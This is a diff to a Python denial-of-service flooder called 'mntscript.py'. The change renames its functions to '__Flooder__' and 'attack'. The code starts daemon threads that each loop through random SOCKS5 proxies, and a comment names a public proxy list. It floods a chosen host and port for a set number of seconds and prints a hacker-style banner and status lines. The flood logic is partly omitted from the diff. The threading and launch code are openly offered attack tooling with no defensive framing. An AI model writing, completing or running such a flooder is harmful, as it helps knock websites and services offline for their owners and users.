@@ -9,9 +9,11 @@ from urllib.request import urlopen
 from ssl import create_default_context
 from colored import fg, bg, attr
 
-razdel = "_________________________________________________\n"
+# global strings
+line = "_________________________________________________\n"
 
-def __Flood__():
+#functions
+def __Flooder__():
     while 1:
         try:
             proxy = choice(PROXIES).split(':')
@@ -28,10 +30,10 @@ def __Flood__():
         except Exception:
             pass
 
-def Start():
+def attack():
     while 1:
         if active_count() <= THREADS:
-            T=Thread(target=__Flood__)
+            T=Thread(target=__Flooder__)
             T.daemon = True
             T.start()
 
@@ -62,10 +64,10 @@ if __name__ == '__main__':
     # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/allproxy_socks5.txt : 6817 proxies
     
     print(f"{fg(99)}███╗░░░███╗███╗░░██╗████████╗\n████╗░████║████╗░██║╚══██╔══╝\n██╔████╔██║██╔██╗██║░░░██║░░░\n██║╚██╔╝██║██║╚████║░░░██║░░░\n██║░╚═╝░██║██║░╚███║░░░██║░░░\n╚═╝░░░░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░\n{attr(0)}") # logo
-    print(f"{fg(54)}" + razdel + f"{attr(0)}")
+    print(f"{fg(54)}" + line + f"{attr(0)}")
     print(f"{fg(93)}root@mntscript > {attr(0)}", f"{fg(93)}[mntscript.py] prepared{attr(0)}", conc, f"{fg(93)}concurrents{attr(0)} (",THREADS,f"threads) {fg(93)}to host{attr(0)}", HOST, f"{fg(93)}with port{attr(0)}", PORT, f"{fg(93)}for{attr(0)}", SECONDS, f"{fg(93)}seconds{attr(0)}")
     print(f"{fg(93)}root@mntscript > {attr(0)}", f"{fg(93)}[mntscript.py] script by $t1cky.dev{attr(0)}")
     test = input(f"{fg(93)}root@mntscript >  {attr(0)}" + f"{fg(93)}[mntscript.py] *PRESS ANY KEY TO START SCRIPT* {attr(0)}")
     print(f"{fg(93)}root@mntscript > {attr(0)}", f"{fg(93)}[mntscript.py] sended{attr(0)}", conc, f"{fg(93)}concurrents to host{attr(0)}", HOST, f"{fg(93)}with port{attr(0)}", PORT, f"{fg(93)}for{attr(0)}", SECONDS, f"{fg(93)}seconds{attr(0)}")
     
-    Start() # START FLOOD
+    attack() # START FLOOD
